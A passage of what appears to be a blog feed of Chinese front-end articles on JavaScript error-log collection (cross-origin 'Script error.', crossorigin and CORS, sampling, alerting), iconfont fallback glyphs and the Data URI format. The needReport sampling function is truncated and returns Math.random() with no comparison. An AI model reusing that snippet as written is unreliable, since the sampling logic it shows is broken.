已经拿到了所有的错误信息，但如果发现是非同源情况，`sanitizeScriptError` 中复写错误信息</span><br><span class="line">sanitizeScriptError(message, line, sourceName, cachedScript);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://trac.webkit.org/browser/branches/chromium/648/Source/WebCore/dom/ScriptExecutionContext.cpp?rev=77122#L301">旧版</a> 的 WebCore 中只判断了 <code>securityOrigin()-&gt;canRequest(targetURL)</code>，新版中还多了一个 <code>cachedScript</code> 的判断，可以看出浏览器对这方面的限制越来越严格。</p><p>在本地测试了下：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/200018530976144.png" alt=""></p><p>可见在 <code>file://</code> 协议下，<code>securityOrigin()-&gt;canRequest(targetURL)</code> 也是 <code>false</code>。</p><p><strong>为何<code>Script error.</code>?</strong></p><p>简单报错： <code>Script error</code>，目的是避免数据泄露到不安全的域中，一个简单的例子：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;bank.com/login.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面我们并没有引入一个 js 文件，而是一个 html，这个 html 是银行的登录页面，如果你已经登录了 <code>bank.com</code>，那 login 页面就会自动跳转到 <code>Welcome xxx...</code>，如果未登录则跳转到 <code>Please Login...</code>，那么 JS 报错也会是 <code>Welcome xxx... is not defined</code>，<code>Please Login... is not defined</code>，通过这些信息可以判断一个用户是否登录他的银行帐号，给 hacker 提供了十分便利的判断渠道，这是相当不安全的。</p><p><strong><code>crossOrigin</code>参数跳过跨域限制</strong></p><p>image 和 script 标签都有 crossorigin 参数，它的作用就是告诉浏览器，我要加载一个外域的资源，并且我信任这个资源。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://localhost/test.js&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然而，却报错了：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/200019005666192.png" alt=""></p><p>这是意料之中的错误，跨域资源共享策略要求，服务器也设置 <code>Access-Control-Allow-Origin</code> 的响应头：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">header</span>(&#x27;Access-Control-<span class="literal">Allow</span>-Origin: *&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>回头看看我们 CDN 的资源，</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/200019081911756.png" alt=""></p><p>Javascript/CSS/Image/Font/SWF 等这些静态资源其实都已经早早地加上了 CORS 响应头。</p><h4 id="2"><a class="headeranchor-link" name="user-content-2" href="#2"></a>2. 压缩代码无法定位到错误的具体位置</h4><p>线上的代码几乎都是经过打包压缩的，几十上百的文件压缩后打包成一个，而且只有一行。当我们收到 <code>a is not defined</code> 的时候，如果只在特定场景下才报错，我们根本无法定位到这个被压缩的 <code>a</code> 是个什么东西，那么此时的错误日志就是无效的。</p><p>第一个想到的办法是利用 sourceMap，利用它可以定位到压缩代码某一点在未压缩代码的具体位置。下面是 sourceMap 引入的格式，在代码的最后一行加入：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span><span class="comment"># sourceMappingURL=index.js.map</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以前使用的是 "//@" 作为开头，现在使用 "//#"，然而对于错误上报，这玩意儿没啥用。JS 不能拿到他真实的行数，只能通过 Chrome DevTools 这样的工具辅助定位，而且并不是每个线上资源都会添加 sourceMap 文件。sourceMap 的用途目前还只能体现在开发阶段。</p><p>当然，如果理解了 sourceMap 的 VLQ编码和位置对应关系，也可以将拿到的日志进行二次解析，映射到真实路径位置，这个成本比较高，貌似暂时也没人尝试过。</p><p>那么，有什么办法，可以定位错误的具体位置，或者说有什么办法可以缩小我们定位问题的难度呢？</p><p>可以这样考虑：打包的时候，在每两个合并的文件之间加上 1000 个空行，最后上线的文件就会变成</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span><span class="params">()</span>&#123;<span class="keyword">var</span> longCode.....&#125;)(); <span class="comment">// file 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1000 个空行</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span><span class="params">()</span>&#123;<span class="keyword">var</span> longCode.....&#125;)(); <span class="comment">// file 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1000 个空行</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span><span class="params">()</span>&#123;<span class="keyword">var</span> longCode.....&#125;)(); <span class="comment">// file 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1000 个空行</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span><span class="params">()</span>&#123;<span class="keyword">var</span> longCode.....&#125;)(); <span class="comment">// file 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _fileConfig = [<span class="string">&#x27;file 1&#x27;</span>, <span class="string">&#x27;file 2&#x27;</span>, <span class="string">&#x27;file 3&#x27;</span>, <span class="string">&#x27;file 4&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果报错在第 3001 行，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">msg, url, line, col, error</span>)&#123;</span><br><span class="line">  <span class="comment">// line = 3001</span></span><br><span class="line">  <span class="keyword">var</span> lineNum = line;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;错误位置：&quot;</span> + _fileConfig[<span class="built_in">parseInt</span>(lineNum / <span class="number">1000</span>) - <span class="number">1</span>]);</span><br><span class="line">  <span class="comment">// -&gt; &quot;错误位置：file 3&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以计算出，错误出现在第三个文件中，范围就缩小了很多。</p><h4 id="3-error"><a class="headeranchor-link" name="user-content-3-error" href="#3-error"></a>3. error 事件的注册</h4><p>多次注册 error 事件，不会重复执行多个回调：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;error&quot;</span>, fn);</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;error&quot;</span>, fn);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>触发错误之后，上面代码的结果为：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/200019171131048.png" alt=""></p><p><code>window.onerror</code> 和 <code>addEventListener</code> 都执行了，并只执行了一次。</p><h4 id="4"><a class="headeranchor-link" name="user-content-4" href="#4"></a>4. 收集日志的量</h4><p>没有必要将所有的错误信息全部送到 Log 中，这个量太大了。如果网页 PV 有 1kw，那么一个必现错误发送的 log 信息将有 1kw 条，大约一个 G 的日志。我们可以给 <code>Reporter</code> 函数添加一个采样率：</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">needReport</span> (sampling)&#123;</span><br><span class="line">  // sampling: 0 - 1</span><br><span class="line">  <span class="keyword">return</span> <span class="type">Math.random()</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个采样率可以按需求来处理，可以同上，使用一个随机数，也可以使用 cookie 中的某个字段（如 nickname）的最后一个字母/数字来判定，也可以将用户的 nickname 进行 hash 计算，再通过最后一位的字母/数字来判断，总之，方法是很多的。</p><h3 id="_4"><a class="headeranchor-link" name="user-content-_4" href="#_4"></a>收集日志布点位置</h3><p>为了更加精准的拿到错误信息，有效地统计错误日志，我们应该更多地采用主动式埋点，比如在一个接口的请求中：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Module A Get Shops Data</span></span><br><span class="line">$.<span class="title function_ invoke__">ajax</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: URL,</span><br><span class="line">  <span class="attr">dataType</span>: <span class="string">&quot;jsonp&quot;</span>,</span><br><span class="line">  <span class="attr">success</span>: function(ret) &#123;</span><br><span class="line">    <span class="keyword">if</span>(ret.status === <span class="string">&quot;failed&quot;</span>) &#123;</span><br><span class="line">      <span class="comment">// 埋点 1</span></span><br><span class="line">      <span class="keyword">return</span> Reporter.<span class="title function_ invoke__">send</span>(&#123;</span><br><span class="line">        <span class="attr">category</span>: <span class="string">&quot;WARN&quot;</span>,</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&quot;Module_A_GET_SHOPS_DATA_FAILED&quot;</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!ret.data || !ret.data.length) &#123;</span><br><span class="line">      <span class="comment">// 埋点 2</span></span><br><span class="line">      <span class="keyword">return</span> Reporter.<span class="title function_ invoke__">send</span>(&#123;</span><br><span class="line">        <span class="attr">category</span>: <span class="string">&quot;WARN&quot;</span>,</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&quot;Module_A_GET_SHOPS_DATA_EMPTY&quot;</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 埋点 3</span></span><br><span class="line">    Reporter.<span class="title function_ invoke__">send</span>(&#123;</span><br><span class="line">      <span class="attr">category</span>: <span class="string">&quot;ERROR&quot;</span>,</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&quot;Module_A_GET_SHOPS_DATA_ERROR&quot;</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面我们精准地布下了三个点，描述十分清晰，这三个点会对我们后续排查线上问题提供十分有利的信息。</p><p><strong>关于 <code>try..catch</code> 的使用</strong></p><p>对于 <code>try..catch</code> 的使用，我的建议是：能不用，尽量不要用。JS代码都是自己写出来的，哪里会出现问题，会出现什么问题，心中应该都有个谱，平时用到 <code>try..catch</code> 的一般只有两个地方：</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JSON 格式不对</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span><span class="built_in">String</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存在不可 decode 的字符</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  <span class="title function_">decodeComponentURI</span>(<span class="built_in">string</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>类似这样的错误都是不太可控的。可以在使用到 <code>try..catch</code> 的地方思考是否可以使用其他方式做兼容。感谢 EtherDream 的<a href="http://www.cnblogs.com/hustskyking/p/fe-monitor.html#3253158">补充</a>。</p><p><strong>关于 <code>window.onerror</code> 的使用</strong></p><p>可以尝试如下代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test.js</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;SHOW ME&quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">  <span class="comment">// 阻止在控制台中打印错误信息</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>上面的代码直接报错了，没有继续往下执行。页面中可能有好几个 script 标签，但是 </span><code>window.onerror</code><span> 这个错误监听一定要放到最前头！</span></p><h3 id="_5"><a class="headeranchor-link" name="user-content-_5" href="#_5"></a>错误的警报与提示</h3><p>什么时候该警报？不能有错就报。上面也说了，因为网络环境和浏览器环境因素，复杂页面我们允许千分之一的错误率。日志处理后的数据图：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/200019264726641.png" alt=""></p><p>图中有两根线，橙色线是今日的数据，浅蓝色线是往日平均数据，每隔 10 分钟产生一条记录，横坐标是 0-24 点的时间轴，纵坐标是错误量。可以很明显的看出，在凌晨一两点左右，服务出现了异常，错误信息是平均值的十几倍，那么这个时候就改报警了。</p><p>报警的条件可以设置得严苛一点，因为误报是件很烦人的事情，短信、邮件、软件等信息轰炸，有的时候还是大半夜。那么，一般满足如下条件可以报警：</p><ul><li>错误超过阈值，比如 10分钟最多允许 100 个错误，结果超过了 100</li><li>错误超过平均值的 10 倍，超过平均值就报警，这个逻辑显然不正确，但是超过了平均值的 10 倍，基本可以认定服务出问题了</li><li>在纳入对比之前，要过滤同 IP 出现的错误，比如一个错误出现在 for 循环或者 while 循环中，再比如一个用户在蹲点抢购，不停的刷新</li></ul><p><strong>友好的错误提示</strong></p><p>对比下面两条日志，catch 的错误日志：</p><blockquote><p>Uncaught ReferenceError: vd is not defined</p></blockquote><p>自定义的错误日志：</p><blockquote><p>"生日模块中获取后端接口信息时，eval 解析出错，错误内容为：vd is not defined."该错误在最近 10 分钟内出现 1000 次，这个错误往日的平均出错量是 50 次 / 10 分钟</p></blockquote><h3 id="_6"><a class="headeranchor-link" name="user-content-_6" href="#_6"></a>网络错误日志工作草案</h3><p>W3C Web Performance工作组发布了网络错误日志工作草案。该文档定义了一个机制，允许Web站点声明一个网络错误汇报策略，浏览器等用户代理可以利用这一机制，汇报影响资源正确加载的网络错误。该文档还定义了一个错误报告的标准格式及其在浏览器和Web服务器之间的传输机制。</p><p>详细草案：<a href="http://www.w3.org/TR/2015/WD-network-error-logging-20150305/">http://www.w3.org/TR/2015/WD-network-error-logging-20150305/</a></p><h3 id="_7"><a class="headeranchor-link" name="user-content-_7" href="#_7"></a>小结</h3><p>功能、测试和监控是程序开发的三板斧，很多工程师可以将功能做的尽善尽美，也了解一些测试方面的知识，可是在监控这个方向上基本处于大脑空白。错误日志的收集、整理算是监控的一个小部分，但是它对我们了解网站稳定性至关重要。文中有忽略的地方希望读者可以补充，错误的地方还望斧正。</p><h3 id="_8"><a class="headeranchor-link" name="user-content-_8" href="#_8"></a>拓展阅读</h3><ul><li><a href="http://xbingoz.com/328.html">基于window.onerror事件 建立前端错误日志</a> by Dx. Yang</li><li><a href="http://www.aliued.cn/2012/10/27/%E6%9E%84%E5%BB%BAweb%E5%89%8D%E7%AB%AF%E5%BC%82%E5%B8%B8%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F-fdsafe.html">构建web前端异常监控系统–FdSafe</a> by 石破</li><li><a href="http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html">JavaScript Source Map 详解</a> by 阮一峰</li><li><a href="http://www.w3.org/TR/2010/WD-html5-20100624/webappapis.html#handler-window-onerror">HTML5标准-window.onerror</a></li><li><a href="http://msdn.microsoft.com/en-us/library/cc197053%28VS.85%29.aspx">MSDN-window.onerror</a></li><li><a href="//developer.mozilla.org/en/DOM/window.onerror">MDN-window.onerror</a></li><li><a href="http://www.w3.org/TR/2015/WD-network-error-logging-20150305/">网络错误日志</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iconfont的蜕化操作</title>
      <link href="/blog/2015/08/17/cb-iconfont-opt/"/>
      <url>/blog/2015/08/17/cb-iconfont-opt/</url>
      
        <content type="html"><![CDATA[<p>很多国外的网站，访问的时候可以看到，页面先是大面积白一下，然后恢复正常。原因是网页上用到了 webfont，这些页面很多情况都是直接引用 google 的 webfont 地址，中华大局域网下，由于网络原因，页面虽已经全部加载，引用的 webfont 资源却还未下载成功，这就导致了使用了 webfont 的内容呈现空白状态，没有被渲染出来。</p><p>如，访问该网站：<a href="http://zurb.com/playground/foundation-icon-fonts-3">http://zurb.com/playground/foundation-icon-fonts-3</a></p><p>为啥国内很少有这种事儿发生？英文字符并不多，生成 webfont 所占用的 unicode range 很小，故英文字体的 webfont 体积是很小的。而中文字符却有好几千个，一个完整中文的 webfont 至少有 2-3M，没人会在自己的网站上使用如此庞大的 webfont 的字体。</p><p>但 webicon 就不一样了，根据页面的需要，只摘取几个 unicode 段位，体积自然也是很小了。为了不影响正常字符的展示，webicon 的制作一般会选用空白的 unicode 段位，这些 unicode 在浏览器下默认展示为 <span>""</span>，一个乱码的符号。那么同样的问题就出现了，由于 CDN 的服务不太稳定或者用户网络原因，页面打开之后，部分 webicon 的资源还未加载成功，那么那些使用到 webicon 的位置便会出现乱码，如果图标较大，体验是十分不好的。</p><h3 id="iconfont_1"><a class="headeranchor-link" name="user-content-iconfont_1" href="#iconfont_1"></a>iconfont 制作的基本原理</h3><p>Unicode&thinsp;码表是一个很大的表格，每个表格都对应一个 Unicode 字符，每个字符都有一个 Unicode 码值对应，如 "李" 对应 "\u674e", "靖" 对应 "\u9756"。因为码表很大，有部分表格并没有对应的字符，但是它有自己的码值。iconfont 的制作，首先将绘制的图形（可以是一张图片、也可以是一个 svg 描述）通过工具或者程序生成文字icon，然后将文字icon对应到码表之中，为了不干预码表中已有的字符，我们通常会把文字icon对应到没有字符的表格中，最后导出我们额外对应的表格信息，生成iconfont。如下图所示：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">                            Unicode 码表</span><br><span class="line">                         +-----------------+</span><br><span class="line">         ...             |<span class="string">     </span>|<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">                         |<span class="string">     </span>|<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line"> 图形icon     文字icon    +-----------------+</span><br><span class="line">+-------+    +------+    |<span class="string">     </span>|<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">|<span class="string">icon a +----&gt;   A  +-----------&gt; Ua </span>|<span class="string">     </span>|</span><br><span class="line">+-------+    +------+    |<span class="string">     </span>|<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">                         +-----------------+</span><br><span class="line">+-------+    +------+    |<span class="string">     </span>|<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">|<span class="string">icon b +----&gt;   B  +-----&gt; Ub +     </span>|<span class="string">     +------&gt; iconfont</span></span><br><span class="line"><span class="string">+-------+    +------+    </span>|<span class="string">     </span>|<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">                         +-----------------+</span><br><span class="line">+-------+    +------+    |<span class="string">     </span>|<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">|<span class="string">icon C +----&gt;   C  +-----&gt; Uc </span>|<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">+-------+    +------+    |<span class="string">     </span>|<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">                         +-----------------+</span><br><span class="line">         ...             |<span class="string">     </span>|<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">                         |<span class="string">     </span>|<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">                         +-----------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>图中，三个icon分别对应到 Unicode 码表中码值为 Ua Ub Uc 的三个表格，那么最后导出的 iconfont 也就只包含这三个字符信息，这个体积是很小的。</p><p>延伸阅读：<a href="http://www.cnblogs.com/hustskyking/p/manufacture-font-face-in-web.html">再探@font-face及webIcon制作</a></p><h3 id="iconfont_2"><a class="headeranchor-link" name="user-content-iconfont_2" href="#iconfont_2"></a>iconfont 的蜕化处理</h3><p>正常的情况下是一堆漂亮的 icon 图标，而当网络较慢或者 CDN 不稳定的时候，用户看到的是图示乱码的框框，优化之后，用户可以看到我们对 iconfont 的蜕化操作。效果预览：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/170948437225461.png" alt=""></p><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"># 绑定 hosts</span><br><span class="line"><span class="number">2.2.2.2</span> at.alicdn.com</span><br><span class="line"># 然后访问淘宝首页，可以看到效果</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>了解了iconfont 的制作之后，理解上图就不难了。中间乱码的那张图里，每个图标对应的都是无字符的码表表格，页面默认的字体呈现这些字符的状态就是 ""。这里我们提到的蜕化处理，只需要在对应 Unicode 码表时，将每个图标对应到有字符的码表表格中，就会看到最上层那张图片的效果。</p><p>有人会问，那些蜕化的图标是从哪里来的？对应的键值又是多少？</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/170948513634127.png" alt=""></p><p>除了 emoji 外，我们输入法能够输出的所有文字在 web 上也都是能够正常显示的，所谓的正常显示就是不会出现 ""。平时常用的搜狗输入法/百度输入法都提供了很多的特殊字符，我们可以在这些特殊字符中找到最能表现icon的字符，当然，甚至可以使用文字、字母来替代。</p><p>比如音乐icon可以使用 "♫" 替代，计算字符码值的方式是：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">var code = <span class="string">&quot;♫&quot;</span>.<span class="built_in">char</span><span class="constructor">CodeAt(0)</span>.<span class="keyword">to</span><span class="constructor">String(16)</span>;</span><br><span class="line"><span class="comment">// htmlEncodedStr 便可以作为icon的内容</span></span><br><span class="line">var htmlEncodedStr = <span class="string">&quot;&lt;#x&quot;</span> + code + <span class="string">&quot;;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以国内目前做的最好的 <a href="http://iconfont.cn/">iconfont 网站</a>为例，演示如何便捷的修改文字icon对应的默认码值:</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/170948589255051.gif" alt=""></p><p>修改完之后保存，此时这个 icon 对应的码值就已经变化了。</p><h3 id="iconfont_2">☞&nbsp;小结</h3><p>很多网站都承载着日均几百上千万的流量，用户的网络环境复杂，每个细节问题都会在部分用户面前暴露无遗，我们要做的就是去优化那些概率性看到的"小问题"，这些"小问题"在庞大的用户群体中会变成一个很大的问题，必须引起重视。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>细说 Data URI</title>
      <link href="/blog/2015/08/12/cb-data-uri/"/>
      <url>/blog/2015/08/12/cb-data-uri/</url>
      
        <content type="html"><![CDATA[<p><span>Data URL 早在 1995 年就被提出，那个时候有很多个版本的 Data URL Schema 定义陆续出现在 </span><a href="//zh.wikipedia.org/zh-cn/VRML">VRML</a><span> 之中，随后不久，其中的一个版本被提上了议案&mdash;&mdash;将它做个一个嵌入式的资源放置在 HTML 语言之中。从 </span><a href="http://www.ietf.org/rfc/rfc2397.txt">RFC</a><span> 文档定稿的时间来看（1998年），它是一个很受欢迎的发明。</span></p><p>Data URIs 定义的内容可以作为小文件被插入到其他文档之中。URI 是 <code>uniform resource identifier</code> 的缩写，它定义了接受内容的协议以及附带的相关内容，如果附带的相关内容是一个地址，那么此时的 URI 也是一个 URL (<code>uniform resource locator</code>)，如：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ftp:<span class="regexp">//</span><span class="number">10.1</span>.<span class="number">1.10</span><span class="regexp">/path/</span>to/filename.ext</span><br><span class="line">http:<span class="regexp">//</span>example.com<span class="regexp">/source/i</span>d</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>协议后面的内容，可以告诉客户端一个准确下载资源的地址，而 URI 并不一定包含一个地址信息，如(<a href="data:image/gif;base64,R0lGODlhEAAOALMAAOazToeHh0tLS/7LZv/0jvb29t/f3//Ub//ge8WSLf/rhf/3kdbW1mxsbP//mf///yH5BAAAAAAALAAAAAAQAA4AAARe8L1Ekyky67QZ1hLnjM5UUde0ECwLJoExKcppV0aCcGCmTIHEIUEqjgaORCMxIC6e0CcguWw6aFjsVMkkIr7g77ZKPJjPZqIyd7sJAgVGoEGv2xsBxqNgYPj/gAwXEQA7" target="_blank">demo</a>)：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">data:image<span class="regexp">/gif;base64,R0lGODlhEAAOALMAAOazToeHh0tLS/</span><span class="number">7</span>LZv<span class="regexp">/0jvb29t/</span>f3<span class="regexp">//</span>Ub<span class="regexp">//g</span>e8WSLf<span class="regexp">/rhf/</span><span class="number">3</span>kdbW1mxsbP<span class="regexp">//m</span>f<span class="regexp">//</span><span class="regexp">/yH5BAAAAAAALAAAAAAQAA4AAARe8L1Ekyky67QZ1hLnjM5UUde0ECwLJoExKcppV0aCcGCmTIHEIUEqjgaORCMxIC6e0CcguWw6aFjsVMkkIr7g77ZKPJjPZqIyd7sJAgVGoEGv2xsBxqNgYPj/g</span>AwXEQA7</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其协议为 data，并告诉客户端将这个内容作为 <code>image/gif</code> 格式来解析，需要解析的内容使用的是 base64 编码。它直接包含了内容但并没有一个确定的资源地址。</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/120937188795030.png" alt=""></p><h3 id="_1"><a class="headeranchor-link" name="user-content-_1" href="#_1"></a>格式</h3><p>Data URI 的格式十分简单，如下所示：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">data:[&lt;mime <span class="attribute">type</span>=<span class="string">&quot;&quot;</span>&gt;][;<span class="attribute">charset</span>=&lt;charset&gt;][;base64],&lt;encoded <span class="attribute">data</span>=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></encoded></charset></mime></p><ul><li><p>第一部分是 <code>data:</code> 协议头，它标识这个内容为一个 data URI 资源。</p></li><li><p>第二部分是 MIME 类型，表示这串内容的展现方式，比如：<code>text/plain</code>，则以文本类型展示，<code>image/jpeg</code>，以 jpeg 图片形式展示，同样，客户端也会以这个 MIME 类型来解析数据。</p></li><li><p>第三部分是编码设置，默认编码是 <code>charset=US-ASCII</code>, 即数据部分的每个字符都会自动编码为 <code>%xx</code>，关于编码的测试，可以在浏览器地址框输入分别输入下面两串内容，查看效果：</p><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line">// output: &amp;auml;&amp;frac12; &amp;aring;&amp;yen;&amp;frac12; -&gt; 使用默认的编码展示，故乱码</span><br><span class="line"><span class="class"><span class="keyword">data</span>:text/html,你好</span></span><br><span class="line">// output: 你好 -&gt; 使用 <span class="type">UTF</span>-<span class="number">8</span> 展示</span><br><span class="line"><span class="class"><span class="keyword">data</span>:text/html;charset=<span class="type">UTF</span>-8,你好</span></span><br><span class="line">// output: 浣犲ソ -&gt; 使用 gbk 展示（浏览器默认编码 <span class="type">UTF</span>-<span class="number">8</span>，故乱码）</span><br><span class="line"><span class="class"><span class="keyword">data</span>:text/html;charset=gbk,你好</span></span><br><span class="line">// output: 你好 -&gt; <span class="type">UTF</span>-<span class="number">8</span> 编码，内容先使用 base64 解码，然后展示</span><br><span class="line"><span class="class"><span class="keyword">data</span>:text/html;charset=<span class="type">UTF</span>-8;base64,5L2g5aW9 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>第四部分是 <a href="http://en.wikipedia.org/wiki/Base64">base64</a> 编码设定，这是一个可选项，base64 编码中仅包含 0-9,a-z,A-Z,+,/,=，其中 = 是用来编码补白的。</p></li><li><p>最后一部分为这个 Data URI 承载的内容，它可以是纯文本编写的内容，也可以是经过 base64编码 的内容。</p></li></ul><p>很多时候我们使用 data URI 来呈现一些较长的内容，如一串二进制数据编码、图片等，采用 base64 编码可以让内容变得更加简短。而对图片来说，在 gzip 压缩之后，base64 图片实际上比原图 gzip 压缩要大，体积增加大约为三分之一，所以使用的时候需要权衡。</p><h3 id="_2"><a class="headeranchor-link" name="user-content-_2" href="#_2"></a>兼容性</h3><p>由于出现时间较早，目前主流的浏览器基本都支持 data URI：</p><ul><li>Firefox 2+</li><li>Opera 7.2+</li><li>Chrome (所有版本)</li><li>Safari (所有版本)</li><li>Internet Explorer 8+</li></ul><p>但是部分浏览器对 data URI 的使用存在限制：</p><ul><li><p>长度限制，长度超长，在一些应用下会导致内存溢出，程序崩溃</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Opera</span> 下限制为 <span class="number">4100</span> 个字符，目前已经去掉了这个限制</span><br><span class="line"><span class="attribute">IE</span> <span class="number">8</span>+ 下限制为 <span class="number">32</span>,<span class="number">768</span> 个字符（<span class="number">32</span>kb），IE9 之后移除了这个限制</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>在 IE 下，data URI 只允许被用到如下地方：</p><ul><li>object (images only)</li><li>img、input type=image、link</li><li>CSS 中允许使用 URL 声明的地方,如 background</li></ul></li><li>在 IE 下，Data URI 的内容必须是经过编码转换的，如 "#"、"%"、非 US-ASCII 字符、多字节字符等，必须经过编码转换</li></ul><p><strong>低版本IE的解决之道 - MHTML</strong></p><p>MHTML 就是 MIME HTML，是 